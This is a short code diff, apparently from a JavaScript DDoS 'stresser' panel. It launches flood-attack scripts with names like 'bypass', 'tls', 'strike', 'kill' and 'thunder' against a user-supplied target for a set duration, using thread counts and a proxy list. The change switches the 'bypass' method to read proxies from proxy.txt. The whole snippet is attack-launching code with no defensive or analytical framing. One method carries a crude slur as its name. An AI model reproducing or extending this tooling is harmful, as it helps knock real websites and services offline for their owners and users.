@@ -325,7 +325,7 @@ const metode = path.join(__dirname, `/lib/cache/${methods}`);
         sigma()
         } else if (methods === 'bypass') {
        pushOngoing(target, methods, duration)
-        exec(`node ${metode} ${target} ${duration} 100 100 GET`)
+        exec(`node ${metode} ${target} ${duration} 100 100 proxy.txt`)
           sigma()
           } else if (methods === 'raw') {
        pushOngoing(target, methods, duration)
@@ -381,7 +381,7 @@ const mem = path.join(__dirname, `MEM`);
         exec(`node ${tls} ${target} ${duration} 100 100`)
         exec(`node ${strike} GET ${target} ${duration} 100 100 proxy.txt`)
 	exec(`node ${kill} ${target} ${duration} 100 20`)
-	exec(`node ${bypass} ${target} ${duration} 100 100 GET`)
+	exec(`node ${bypass} ${target} ${duration} 100 100 proxy.txt`)
 	exec(`node ${raw} ${target} ${duration}`)
 	exec(`node ${thunder} ${target} ${duration} 100 100 proxy.txt`)
         exec(`node ${rape} ${duration} 100 proxy.txt 70 ${target}`)
